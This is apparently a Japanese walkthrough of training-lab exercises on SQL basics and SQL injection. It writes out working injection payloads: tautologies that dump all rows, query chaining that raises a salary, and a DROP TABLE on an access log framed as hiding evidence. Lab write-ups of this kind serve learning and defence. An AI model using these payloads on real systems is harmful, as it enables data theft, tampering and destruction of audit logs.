# (A1)Injection 節の問題の回答
DBとそれを扱うためのSQLの基本的な知識が要求されます。私はあまりDBに関して詳しいほうではないのでわからない部分は調べながら回答しました。
SQLInjectionという攻撃であっても、使う知識自体は意外と基本的なモノが多いことに驚きました。

## 2 What is SQL?
まずはSQLの基本の確認から。Bob Francoさんのdepartmentを確認しましょう。
ここではAdmin権限をすでに得ているため普通のQueryを組み立てます
```SQL
SELECT department FROM employees WHERE first_name = 'Bob' and last_name = 'Franco';
```
Tableの内容も見えているので、Bob Franco氏のdepartmentを抽出してクリア。
このテーブルの内容ならand last name = 'Franco'はなしでも動くとは思いますが一応記述します。

## 3 Data Manipulation Language 
上と同じくAdmin権限は持っているので、言われた通りTableを書き換えます
Tobi BarnettさんのdepartmentをSalesに変更します
```SQL
UPDATE employees SET department = 'Sales' WHERE first_name = 'Tobi' AND last_name = 'Barnett';
```
UPDATE文を使ってemployeesテーブル内の指定した行の該当データを書き換えました

## 4 Data Definition Language
employees Tableに"phone"というVARCHAR(20)のcolumn(列)を追加しましょう
```SQL
ALTER TABLE employees ADD phone VARCHAR(20);
```
データ型指定の後、明示的にNULLを示したほうが良い...のか?(DB弱者)

## 5 Data Control Language 
grant_rights Table に対する権限を unauthorized_userに対して与えます
```SQL
GRANT ALL PRIVILEGES ON grant_rights TO unauthorized_user;
```
ALL PRIVILEGESはSELECT,INSERT,DELETE,UPDATEのすべての権限を与えます。
ちなみに、GRANTとは逆に、権限を取り消してアクセスできないようにしたい場合はREVOKEを使用します。構文はほぼ同じです。

## 9 Try It! String SQL injection 
ここからSQLInjectionについての勉強が始まります。まずは練習として選択肢から正しい選択を選んでいきましょう。ページに提示されている説明文を解釈すると、
```SQL
SELECT FROM user_data WHERE first_name = 'John' AND last_name = ' [入力されたデータがここに入る] ';
```
というSQL文が実行されることが示されているので、それをヒントに解いていきましょう。
まず最初の選択肢を **Smith'** にすることで、 last_name = 'Smith' となり、
次にorを選択し、最後に **'1' = '1** を選択すると
```SQL
SELECT FROM user_data WHERE first_name = 'John' AND last_name = 'Smith' or '1' = '1' ;
```
という文章が出来上がり、条件式を左から順番に評価すると常に結果がTRUEとなるのですべてのユーザに関するデータが出力されます

## 10 Try It! Numeric SQL injection
入力フィールドは数字であることが期待されているので、それを考慮したうえで文章を組み立てる必要があります。
最初のフィールド(Login_Count)に**適当な数字**、次のフィールドに **1 or 1 = 1**といったように、適当な数字の後に or 1 = 1 という文を追加することで常にTRUEの条件を成立させることができ、正解となります。この場合組み立てらた文章は以下のようになります
```SQL
SELECT * From user_data WHERE Login_Count = 0 and userid= 1 or 1=1;
```

## 11 Compromising confidentiality with String SQL injection
SQLを用いてテーブル内のほかのemployeesの情報を取得することが目的です。
このページでは自分の名前がJohn Smithであること、現在割り当てられているTAN-(Transaction Authorization number:トランザクション認証番号)Transactionを承認するための使い捨てのワンタイムパスワード-が提示されていますが、これらは無くてもこの問題を解くことができました。
Employee Name のフィールドに **foo** 
Authentication TAN のフィールドに **bar' or '1'='1**
と入力することで、
```SQL
SELECT * FROM employees WHERE last_name = 'foo' AND auth_tan = 'bar' OR '1' = '1';
```
という文章が組み立てられ、条件が常にTRUEとなりすべてのデータを閲覧できます。

## 12 Compromising Integrity with Query chaining
11の結果を見ると、どやらTobi と Bob が私よりもたくさん給料をもらっているらしいことが分かりました。私はもちろん放っておけないらしいので自分の給料を上げることにしたそうです。

Employee Nameフィールドには**foo**を
Authentication TANフィールドには**bar'; UPDATE employees SET salary = 10000000  WHERE first_name = 'John' and last_name = 'Smith**
と入力します。一度エディタで組み上げてから入力したほうがいいですね。
これによって以下の2つQueryが実行されると考えられます
```SQL
SELECT * FROM employees WHERE last_name = 'foo' AND auth_tan = 'bar'; 
UPDATE employees SET salary = 10000000  WHERE first_name = 'John' and last_name = 'Smith
```
上のSELECT文はこの問題とあまり関係がなく、問題は下です。
フィールド内に;を追加したことによりQueryが一度終了し、そのあとから新しいQueryを自分で組み立て、実行してsalaryを書き換えています。(Query chaining)
ダイナミック昇給の成功です。良かったですね。

## 13 Compromising Availability
給料を書き換えたことがバレるとまずいのでログを格納するテーブルを完全に削除することにしたようです。ページにはアクションを検索する窓があるのでそこに対してInjectionを行いましょう  
アクションの検索では検索する単語が含まれているかどうかの判断にLIKE文が使用されていることが予想でき、Hintには"SELECT * FROM access_log WHERE action LIKE '%" + action + "%'"とあります。actionの中に入力した文字列が入るので、後ろの%を読み飛ばす必要があり、この場合コメントアウト"--"が使えます  
foo';DROP TABLE access_log;と検索フィールドに入力することで
```SQL 
SELECT * FROM access_log WHERE action LIKE '%foo';DROP TABLE access_log;--%
```
という文が組み立てられ、Query chainingによってTABLEをDROPすることができます。
ちなみにDROPすると対象のオブジェクトが完全に削除され、ロールバック付加できず表構造も残りません